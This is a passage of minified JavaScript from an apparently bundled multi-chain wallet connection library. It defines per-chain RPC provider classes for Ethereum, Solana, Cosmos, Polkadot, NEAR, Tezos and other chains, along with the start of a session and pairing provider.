e||(e={}))zut.call(e,t)&&RG(r,t,e[t]);if($G)for(var t of $G(e))Wut.call(e,t)&&RG(r,t,e[t]);return r},Hut=(r,e)=>Fut(r,qut(e));function Cc(r,e,t){var i;const n=hw(r);return((i=e.rpcMap)==null?void 0:i[n.reference])||`${zoe}?chainId=${n.namespace}:${n.reference}&projectId=${t}`}function I2(r){return r.includes(":")?r.split(":")[1]:r}function Yoe(r){return r.map(e=>`${e.split(":")[0]}:${e.split(":")[1]}`)}function Vut(r,e){const t=Object.keys(e.namespaces).filter(n=>n.includes(r));if(!t.length)return[];const i=[];return t.forEach(n=>{const s=e.namespaces[n].accounts;i.push(...s)}),i}function M8(r={},e={}){const t=OG(r),i=OG(e);return Uut(t,i)}function OG(r){var e,t,i,n,s;const o={};if(!Qf(r))return o;for(const[a,c]of Object.entries(r)){const l=CE(a)?[a]:c.chains,u=c.methods||[],d=c.events||[],h=c.rpcMap||{},f=Qm(a);o[f]=Hut(B8(B8({},o[f]),c),{chains:Sd(l,(e=o[f])==null?void 0:e.chains),methods:Sd(u,(t=o[f])==null?void 0:t.methods),events:Sd(d,(i=o[f])==null?void 0:i.events)}),(Qf(h)||Qf(((n=o[f])==null?void 0:n.rpcMap)||{}))&&(o[f].rpcMap=B8(B8({},h),(s=o[f])==null?void 0:s.rpcMap))}return o}function BG(r){return r.includes(":")?r.split(":")[2]:r}function MG(r){const e={};for(const[t,i]of Object.entries(r)){const n=i.methods||[],s=i.events||[],o=i.accounts||[],a=CE(t)?[t]:i.chains?i.chains:Yoe(i.accounts);e[t]={chains:a,methods:n,events:s,accounts:o}}return e}function RT(r){return typeof r=="number"?r:r.includes("0x")?parseInt(r,16):(r=r.includes(":")?r.split(":")[1]:r,isNaN(Number(r))?r:Number(r))}const Joe={},Ci=r=>Joe[r],OT=(r,e)=>{Joe[r]=e};var Kut=Object.defineProperty,Gut=(r,e,t)=>e in r?Kut(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,pm=(r,e,t)=>Gut(r,typeof e!="symbol"?e+"":e,t);class Zut{constructor(e){pm(this,"name","polkadot"),pm(this,"client"),pm(this,"httpProviders"),pm(this,"events"),pm(this,"namespace"),pm(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=I2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}}var Yut=Object.defineProperty,Jut=Object.defineProperties,Qut=Object.getOwnPropertyDescriptors,DG=Object.getOwnPropertySymbols,Xut=Object.prototype.hasOwnProperty,edt=Object.prototype.propertyIsEnumerable,ZP=(r,e,t)=>e in r?Yut(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,LG=(r,e)=>{for(var t in e||(e={}))Xut.call(e,t)&&ZP(r,t,e[t]);if(DG)for(var t of DG(e))edt.call(e,t)&&ZP(r,t,e[t]);return r},UG=(r,e)=>Jut(r,Qut(e)),gm=(r,e,t)=>ZP(r,typeof e!="symbol"?e+"":e,t);class tdt{constructor(e){gm(this,"name","eip155"),gm(this,"client"),gm(this,"chainId"),gm(this,"namespace"),gm(this,"httpProviders"),gm(this,"events"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain())}async request(e){switch(e.request.method){case"eth_requestAccounts":return this.getAccounts();case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain());case"wallet_getCapabilities":return await this.getCapabilities(e);case"wallet_getCallsStatus":return await this.getCallStatus(e)}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(parseInt(e),t),this.chainId=parseInt(e),this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,t){const i=t||Cc(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=parseInt(I2(t));e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}getHttpProvider(){const e=this.chainId,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}async handleSwitchChain(e){var t,i;let n=e.request.params?(t=e.request.params[0])==null?void 0:t.chainId:"0x0";n=n.startsWith("0x")?n:`0x${n}`;const s=parseInt(n,16);if(this.isChainApproved(s))this.setDefaultChain(`${s}`);else if(this.namespace.methods.includes("wallet_switchEthereumChain"))await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:n}]},chainId:(i=this.namespace.chains)==null?void 0:i[0]}),this.setDefaultChain(`${s}`);else throw new Error(`Failed to switch to chain 'eip155:${s}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}async getCapabilities(e){var t,i,n,s,o;const a=(i=(t=e.request)==null?void 0:t.params)==null?void 0:i[0],c=((s=(n=e.request)==null?void 0:n.params)==null?void 0:s[1])||[],l=`${a}${c.join(",")}`;if(!a)throw new Error("Missing address parameter in `wallet_getCapabilities` request");const u=this.client.session.get(e.topic),d=((o=u?.sessionProperties)==null?void 0:o.capabilities)||{};if(d!=null&&d[l])return d?.[l];const h=await this.client.request(e);try{await this.client.session.update(e.topic,{sessionProperties:UG(LG({},u.sessionProperties||{}),{capabilities:UG(LG({},d||{}),{[l]:h})})})}catch(f){console.warn("Failed to update session with capabilities",f)}return h}async getCallStatus(e){var t,i;const n=this.client.session.get(e.topic),s=(t=n.sessionProperties)==null?void 0:t.bundler_name;if(s){const a=this.getBundlerUrl(e.chainId,s);try{return await this.getUserOperationReceipt(a,e)}catch(c){console.warn("Failed to fetch call status from bundler",c,a)}}const o=(i=n.sessionProperties)==null?void 0:i.bundler_url;if(o)try{return await this.getUserOperationReceipt(o,e)}catch(a){console.warn("Failed to fetch call status from custom bundler",a,o)}if(this.namespace.methods.includes(e.request.method))return await this.client.request(e);throw new Error("Fetching call status not approved by the wallet.")}async getUserOperationReceipt(e,t){var i;const n=new URL(e),s=await fetch(n,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(jn("eth_getUserOperationReceipt",[(i=t.request.params)==null?void 0:i[0]]))});if(!s.ok)throw new Error(`Failed to fetch user operation receipt - ${s.status}`);return await s.json()}getBundlerUrl(e,t){return`${hut}?projectId=${this.client.core.projectId}&chainId=${e}&bundler=${t}`}}var rdt=Object.defineProperty,idt=(r,e,t)=>e in r?rdt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,mm=(r,e,t)=>idt(r,typeof e!="symbol"?e+"":e,t);class ndt{constructor(e){mm(this,"name","solana"),mm(this,"client"),mm(this,"httpProviders"),mm(this,"events"),mm(this,"namespace"),mm(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=I2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}}var sdt=Object.defineProperty,odt=(r,e,t)=>e in r?sdt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,wm=(r,e,t)=>odt(r,typeof e!="symbol"?e+"":e,t);class adt{constructor(e){wm(this,"name","cosmos"),wm(this,"client"),wm(this,"httpProviders"),wm(this,"events"),wm(this,"namespace"),wm(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=I2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}}var cdt=Object.defineProperty,ldt=(r,e,t)=>e in r?cdt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,bm=(r,e,t)=>ldt(r,typeof e!="symbol"?e+"":e,t);class udt{constructor(e){bm(this,"name","algorand"),bm(this,"client"),bm(this,"httpProviders"),bm(this,"events"),bm(this,"namespace"),bm(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(!this.httpProviders[e]){const i=t||Cc(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;e[t]=this.createHttpProvider(t,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace,this.client.core.projectId);return typeof i>"u"?void 0:new Vr(new li(i,Ci("disableProviderPing")))}}var ddt=Object.defineProperty,hdt=(r,e,t)=>e in r?ddt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,vm=(r,e,t)=>hdt(r,typeof e!="symbol"?e+"":e,t);class fdt{constructor(e){vm(this,"name","cip34"),vm(this,"client"),vm(this,"httpProviders"),vm(this,"events"),vm(this,"namespace"),vm(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{const i=this.getCardanoRPCUrl(t),n=I2(t);e[n]=this.createHttpProvider(n,i)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}getCardanoRPCUrl(e){const t=this.namespace.rpcMap;if(t)return t[e]}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||this.getCardanoRPCUrl(e);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}}var pdt=Object.defineProperty,gdt=(r,e,t)=>e in r?pdt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,ym=(r,e,t)=>gdt(r,typeof e!="symbol"?e+"":e,t);class mdt{constructor(e){ym(this,"name","elrond"),ym(this,"client"),ym(this,"httpProviders"),ym(this,"events"),ym(this,"namespace"),ym(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=I2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}}var wdt=Object.defineProperty,bdt=(r,e,t)=>e in r?wdt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,xm=(r,e,t)=>bdt(r,typeof e!="symbol"?e+"":e,t);class vdt{constructor(e){xm(this,"name","multiversx"),xm(this,"client"),xm(this,"httpProviders"),xm(this,"events"),xm(this,"namespace"),xm(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=I2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}}var ydt=Object.defineProperty,xdt=(r,e,t)=>e in r?ydt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Cm=(r,e,t)=>xdt(r,typeof e!="symbol"?e+"":e,t);class Cdt{constructor(e){Cm(this,"name","near"),Cm(this,"client"),Cm(this,"httpProviders"),Cm(this,"events"),Cm(this,"namespace"),Cm(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(this.chainId=e,!this.httpProviders[e]){const i=t||Cc(`${this.name}:${e}`,this.namespace);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;e[t]=this.createHttpProvider(t,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace);return typeof i>"u"?void 0:new Vr(new li(i,Ci("disableProviderPing")))}}var Edt=Object.defineProperty,_dt=(r,e,t)=>e in r?Edt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Em=(r,e,t)=>_dt(r,typeof e!="symbol"?e+"":e,t);class Sdt{constructor(e){Em(this,"name","tezos"),Em(this,"client"),Em(this,"httpProviders"),Em(this,"events"),Em(this,"namespace"),Em(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(this.chainId=e,!this.httpProviders[e]){const i=t||Cc(`${this.name}:${e}`,this.namespace);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{e[t]=this.createHttpProvider(t)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace);return typeof i>"u"?void 0:new Vr(new li(i))}}var Adt=Object.defineProperty,Idt=(r,e,t)=>e in r?Adt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,_m=(r,e,t)=>Idt(r,typeof e!="symbol"?e+"":e,t);class Tdt{constructor(e){_m(this,"name",Fm),_m(this,"client"),_m(this,"httpProviders"),_m(this,"events"),_m(this,"namespace"),_m(this,"chainId"),this.namespace=e.namespace,this.events=Ci("events"),this.client=Ci("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace.chains=[...new Set((this.namespace.chains||[]).concat(e.chains||[]))],this.namespace.accounts=[...new Set((this.namespace.accounts||[]).concat(e.accounts||[]))],this.namespace.methods=[...new Set((this.namespace.methods||[]).concat(e.methods||[]))],this.namespace.events=[...new Set((this.namespace.events||[]).concat(e.events||[]))],this.httpProviders=this.createHttpProviders()}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider(e.chainId).request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(_l.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){var e,t;const i={};return(t=(e=this.namespace)==null?void 0:e.accounts)==null||t.forEach(n=>{const s=hw(n);i[`${s.namespace}:${s.reference}`]=this.createHttpProvider(n)}),i}getHttpProvider(e){const t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||Cc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,Ci("disableProviderPing")))}}var kdt=Object.defineProperty,Ndt=Object.defineProperties,Pdt=Object.getOwnPropertyDescriptors,jG=Object.getOwnPropertySymbols,$dt=Object.prototype.hasOwnProperty,Rdt=Object.prototype.propertyIsEnumerable,YP=(r,e,t)=>e in r?kdt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,D8=(r,e)=>{for(var t in e||(e={}))$dt.call(e,t)&&YP(r,t,e[t]);if(jG)for(var t of jG(e))Rdt.call(e,t)&&YP(r,t,e[t]);return r},BT=(r,e)=>Ndt(r,Pdt(e)),Hc=(r,e,t)=>YP(r,typeof e!="symbol"?e+"":e,t);class CB{constructor(e){Hc(this,"client"),Hc(this,"namespaces"),Hc(this,"optionalNamespaces"),Hc(this,"sessionProperties"),Hc(this,"scopedProperties"),Hc(this,"events",new T0),Hc(this,"rpcProviders",{}),Hc(this,"session"),Hc(this,"providerOpts"),Hc(this,"logger"),Hc(this,"uri"),Hc(this,"disableProviderPing",!1),this.providerOpts=e,this.logger=typeof e?.logger<"u"&&typeof e?.logger!="string"?e.logger:Iu(ra({level:e?.logger||TG})),this.disableProviderPing=e?.disableProviderPing||!1}static async init(e){const t=new CB(e);return await t.initialize(),t}async request(e,t,i){const[n,s]=this.validateChain(t);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(n).request({request:D8({},e),chainId:`${n}:${s}`,topic:this.session.topic,expiry:i})}sendAsync(e,t,i,n){const s=new Date().getTime();this.request(e,i,n).then(o=>t(null,bl(s,o))).catch(o=>t(o,void 0))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:(e=this.session)==null?void 0:e.topic,reason:Vi("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.setNamespaces(e),await this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}async authenticate(e,t){if(!this.client)throw new Error("Sign Client not initialized");this.setNamespaces(e),await this.cleanupPendingPairings();const{uri:i,response:n}=await this.client.authenticate(e,t);i&&(this.uri=i,this.events.emit("display_uri",i));const s=await n();if(this.session=s.session,this.session){const o=MG(this.session.namespaces);this.namespaces=M8(this.namespaces,o),await this.persist("namespaces",this.namespaces),this.onConnect()}return s}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}removeListener(e,t){this.events.removeListener(e,t)}off(e,t){this.events.off(e,t)}get isWalletConnect(){return!0}async pair(e){const{uri:t,approval:i}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties});t&&(this.uri=t,this.events.emit("display_uri",t));const n=await i();this.session=n;const s=MG(n.namespaces);return this.namespaces=M8(this.namespaces,s),await this.persist("namespaces",this.namespaces),await this.persist("optionalNamespaces",this.optionalNamespaces),this.onConnect(),this.session}setDefaultChain(e,t){try{if(!this.session)return;const[i,n]=this.validateChain(e),s=this.getProvider(i);s.name===Fm?s.setDefaultChain(`${i}:${n}`,t):s.setDefaultChain(n,t)}catch(i){if(!/Please call connect/.test(i.message))throw i}}async cleanupPendingPairings(e={}){this.logger.info("Cleaning up inactive pairings...");const t=this.client.pairing.getAll();if(Jf(t)){for(const i of t)e.deletePairings?this.client.core.expirer.set(i.topic,0):await this.client.core.relayer.subscriber.unsubscribe(i.topic);this.logger.info(`Inactive pairings cleared: ${t.length}`)}}abortPairingAttempt(){this.logger.warn("abortPairingAttempt is deprecated. This is now a no-op.")}async checkStorage(){this.namespaces=await this.getFromStore("namespaces")||{},this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.session&&this.createProviders()}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){var e,t;if(this.client=this.providerOpts.client||await 